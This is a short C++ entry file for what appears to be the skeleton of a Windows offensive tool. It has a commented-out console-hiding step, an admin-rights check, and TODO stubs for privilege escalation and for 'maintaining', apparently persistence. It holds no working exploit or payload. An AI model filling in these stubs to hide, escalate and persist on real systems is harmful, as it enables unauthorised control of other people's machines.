#include <iostream>
#include <Windows.h>

#include "System.h"
#include "PrivilegeEscalation.h"


int main(int argc, char** argv)
{
	// Hide the CMD prompt window
	/*HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);*/

	// System Properties Configuration
	System::setArguments(argc, argv);

	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
	std::cout << System::getIsSystemAdmin() << std::endl;
	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
	{
		// TODO: Privilege Escalation Running
		std::cout << "privilege" << std::endl;
	}

	// TODO: Maintaining

	// TODO: Wait

	system("PAUSE");
	return 0;
}